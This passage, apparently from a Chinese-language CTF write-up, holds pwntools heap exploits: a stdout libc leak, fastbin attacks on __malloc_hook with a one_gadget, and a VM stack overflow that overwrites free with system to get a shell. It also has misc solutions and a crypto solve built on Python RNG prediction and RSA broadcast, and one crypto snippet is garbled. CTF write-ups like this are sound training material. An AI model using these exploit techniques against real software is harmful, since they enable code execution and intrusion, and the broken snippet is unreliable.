        payload = '\x11' * 0xe0
        payload += p64(0) + p64(0xf1)
        payload += '\x22' * 0xe0 + p64(0) + p64(0xf1) + "\n"
        edit(0,payload)
        delete(2)
        payload = '\x11' * 0xe0
        payload += p64(0) + p64(0xf1)
        payload += '\x22' * 0xe0 + p64(0) + p64(0xf1)
        payload += p16(0x25cf)
        payload += '\n'
        edit(0,payload)
        add(3,0xe8)
        add(4,0xe8)
        payload = "\x00" + p64(0)*4
        payload = flat('aaaaaaaaa',p64(0)*7,0xfbad1800,0,0,0,p8(0),'\n')
        edit(4,payload)
        ru(p64(0xfbad1800))
        r(0x20)
        libc.address = uu64(r(6))-libc.sym._IO_2_1_stdout_-131
        success('libc.address = 0x%x' % libc.address)
        assert libc.address % 0x1000 == 0
        # hijack control flow
        fastbin_attack1 = libc.sym.__malloc_hook - (0x7ffff7dd1b10 - 0x7ffff7dd196f)
        fastbin_attack2 = libc.sym.__malloc_hook - (0x7ffff7dd1b10 - 0x7ffff7dd1a50)
        delete(3)
        payload = '\x11' * 0xe0
        payload += p64(0) + p64(0xf1)
        payload += '\x22' * 0xe0 + p64(0) + p64(0xf1)
        payload += p64(fastbin_attack1)
        payload += '\n'
        edit(0,payload)
        add(3,0xe8)
        add(4,0xe8)
        payload = "\x00" + p64(0)*7 + p64(libc.address + 0x00007ffff7dd06e0 - 0x7ffff7a0d000)
        payload += p64(0) * 19 + p64(0xff) + "\n"
        edit(4,payload)
        delete(3)
        payload = '\x11' * 0xe0
        payload += p64(0) + p64(0xf1)
        payload += '\x22' * 0xe0 + p64(0) + p64(0xf1)
        payload += p64(fastbin_attack2)
        payload += '\n'
        edit(0,payload)
        add(3,0xe8)
        add(4,0xe8)
        payload = p64(0)*21 + p64(libc.sym.one_gadget)+ p64(libc.sym.__libc_realloc+13)+ "\n"
        # payload = p64(0)*22 + p64(libc.sym.one_gadget)+ "\n"
        # dbg(0x0DEE) # edit
        edit(4,payload)
        add(3,0x100)
        return io
    if __name__ == '__main__':
        if len(sys.argv) > 1:
            io = remote(sys.argv[1], sys.argv[2])
        else:
            io = process(binary_file, 0)
        exploit(io)
        io.interactive()
## ezarch
[M]emory
Set的时候设置stack为mem-0x1000的位置，对于bp只检查与mem->size的大小，而不是检查stack_max，使得bp可以栈溢出  
由于Partial RELRO，接下来的思路是将stack指针劫持到got表。  
本来想通过断点打印的信息把libc leak出来的，不过既然有add和sub这样的opcode，直接根据libc的相对偏移去加减操作省事很多。  
由于寄存器是32位的，分别将free的高低32位设置为system。再一次[M]emory
Set的时候会free掉这个chunk，所以在payload头部写入/bin/sh，并且设置eip为8跳过这个字符串。
    #-*- coding: utf-8 -*-    from pwn import *
    binary_file = './ezarch'
    context.binary = binary_file
    context.terminal = ['tmux', 'sp', '-h']
    elf = ELF(binary_file) 
    libc = elf.libc
    one_gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
    libc.symbols['one_gadget'] = one_gadgets[1]
    context.log_level = 'debug'
    def dbg(breakpoint):
        glibc_dir = '/usr/src/glibc/glibc-2.27/'
        gdbscript = 'directory %smalloc\n' % glibc_dir
        gdbscript += 'directory %sstdio-common/\n' % glibc_dir
        gdbscript += 'directory %sstdlib/\n' % glibc_dir
        gdbscript += 'directory %slibio\n' % glibc_dir
        elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(io.pid)).readlines()[1], 16) if elf.pie else 0
        gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
        gdbscript += 'c\nvis_heap_chunks 0x555555757000 20\n'
        log.info(gdbscript)
        gdb.attach(io, gdbscript)
        time.sleep(1)
    def exploit(io):
        s       = lambda data               :io.send(str(data)) 
        sa      = lambda delim,data         :io.sendafter(str(delim), str(data))
        sl      = lambda data               :io.sendline(str(data))
        sla     = lambda delim,data         :io.sendlineafter(str(delim), str(data))
        r       = lambda numb=4096          :io.recv(numb)
        ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
        irt     = lambda                    :io.interactive()
        uu32    = lambda data               :u32(data.ljust(4, '\0'))
        uu64    = lambda data               :u64(data.ljust(8, '\0'))
        func = lambda opcode, _type1, _type2, arg0, arg1: flat(p8(opcode), p8(_type1*0x10+_type2), p32(arg0), p32(arg1))
        # reg
        r = [i for i in range(0x10)]
        esp = 16
        ebp = 17
        # _type1    
        stackreg = 0
        regimm = 1
        regreg = 2
        # _type2    
        no_ptr = 0
        ptr = 2
        # opcode
        error = 0
        add = 1
        sub = 2
        mov = 3
        xor = 4
        _or = 5
        _and = 6
        shl = 7
        shr = 8
        push = 9
        pop = 0xA
        call = 0xB
        ret = 0xC
        test = 0xD
        test2 = 0xE
        jz = 0xF
        jz2 = 0x10
        nop = 0x11
        payload = flat(
            '/bin/sh\x00',
            func(mov,regimm,no_ptr,ebp,0x1008),
            func(mov,regreg,no_ptr,r[0],ebp),
            func(sub,regimm,no_ptr,r[0],0xa8),
            func(mov,stackreg,ptr,ebp,r[0]),
            func(mov,regimm,no_ptr,ebp,8),
            func(mov,regreg,no_ptr,r[0],ebp),
            func(sub,regimm,no_ptr,r[0],libc.sym.puts-libc.sym.system),
            func(mov,regimm,no_ptr,ebp,0),
            func(mov,stackreg,ptr,ebp,r[0]),
            func(mov,regimm,no_ptr,ebp,8+4),
            func(mov,regreg,no_ptr,r[0],ebp),
            func(mov,regimm,no_ptr,ebp,4),
            func(mov,stackreg,ptr,ebp,r[0]),
        )
        sla('>', 'M')
        sla('>', 0x1100)
        sla('>', len(payload))
        sa(')', payload)
        sla('>', 8)
        sla('>', 0)
        sla('>', 0)
        # dbg(0x9C0) # run
        # dbg(0x0AC2) # free
        sla('>','R')
        sla('>','M')
        sla('size>',1)
        return io
    if __name__ == '__main__':
        if len(sys.argv) > 1:
            io = remote(sys.argv[1], sys.argv[2])
        else:
            io = process(binary_file, 0)
        exploit(io)
        io.interactive()
# **Misc：**
## Hello Bytectf
打开题目即可getflag
## jigsaw
遇到题目怎么办？当然是人工做题了，先把没有带白字的图片，全部删掉，先把能拼接的都拼接起来，然后再整体连接起来。突然发现一个flag  
根据"{"大致确定了中间位置，然后逐个拼接  
最终拼接完毕  
图片flag为flag{fate_stay_nt}，提交然后失败  
然后把flag换成bytectf即bytectf{fate_stay_nt}，提交成功
## betgame
    # coding=utf-8
    from pwn import *
    p=remote('112.125.25.81',9999)
    # context(log_level='debug')
    f = ['j','s','b']
    def getind(x,y):
        if y == 0:
            return x
        elif y ==1:
            return (x+y)%3
        elif y == -1:
            if x > 0:
                return x+y
            elif x == 0:
                return 2
    for i in range(10):
        print i,"1"
        p.recvuntil("e: ")
        t = p.recvline().strip('\n')
        p.sendline(f[getind(f.index(t),0)])
        print i, "2"
        p.recvuntil("e: ")
        t = p.recvline().strip('\n')
        p.sendline(f[getind(f.index(t), -1)])
        print i, "3"
        p.recvuntil("e: ")
        t = p.recvline().strip('\n')
        p.sendline(f[getind(f.index(t), 1)])
    p.interactive()
##
##
# **Crypto：**
## lrlr
通过old的1000组可以预测python随机数，  
一共2轮aes加密，既然密钥可以预测出来，自然就能解密得到clist。  
    from Crypto.Util.number import getPrime, bytes_to_long, long_to_bytes
    from Crypto.Cipher import AES
    import random
    from randcrack import RandCrack
    rc = RandCrack()
    with open('old') as file:
        old = [int(i) for i in file.read().strip().split('\n')]
    index = 0
    for i in range(index,624):
        rc.submit(old[index])
        index+=1
    for i in range(1000-624):
        assert(old[index]==rc.predict_getrandbits(32))
        index+=1
    with open('cl') as file:
        nlist = [eval(i) for i in file.read().strip().split('\n')]
    with open('new') as file:
        clist=[i.decode('hex') for i in file.read().strip().split('\n')]
    key1=[]
    key2=[]
    key3=[]
    for i in range(24):
        key1.append(rc.predict_getrandbits(128))
    for i in range(24):
        key2.append(rc.predict_getrandbits(128))
    for i in range(24):
        key3.append(rc.predict_getrandbits(128))
    tmp1=[]
    for i in range(24):
        handle = AES.new(long_to_bytes(key3[i]), AES.MODE_CBC, "\x00"*16)
        tmpstate=handle.decrypt(clist[i])
        tmp1.append(tmpstate)
    tmp2=[]
    for i in range(24):
        handle = AES.new(long_to_bytes(key2[i]), AES.MODE_CBC, "\x00"*16)
        tmpstate=handle.decrypt(tmp1[i])
        tmp2.append(tmpstate)
    # tmp3=[]
    # for i in range(24):
    #     handle = AES.new(long_to_bytes(key1[i]), AES.MODE_CBC, "\x00"*16)
    #     tmpstate=handle.decrypt(tmp2[i])
    #     tmp3.append(tmpstate)
    c=[]
    for i in tmp2:
        c.append(bytes_to_long(i))
    for i in range(17):
        print 'n = %d'%nlist[i]
        print 'e = 17'
        print 'c = %d'%c[i]
        print '\n'
然后有了24组n,c；e=17。随便选择17组去广播攻击  
最后一步类似jarvis oj上的bbencode原题，循环编码，判断flag开头的字符串
    def bbencode(n):
        a = 0
        for i in bin(n)[2:]:
            a = a > 256:
                a = a ^ 0x10000000000000000000000000000000000000000000000000000000000000223L
        return a
    result = 61406796444626535559771097418338494728649815464609781204026855332620301752444
    for i in range(10000):
        result = bbencode(result)
        if("666c6167" == str(hex(result))[2:10]):
            print i
            print hex(result)[2:-1].decode('hex')